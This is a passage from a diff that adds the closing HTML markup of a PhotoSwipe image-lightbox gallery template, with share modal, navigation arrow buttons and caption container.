+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
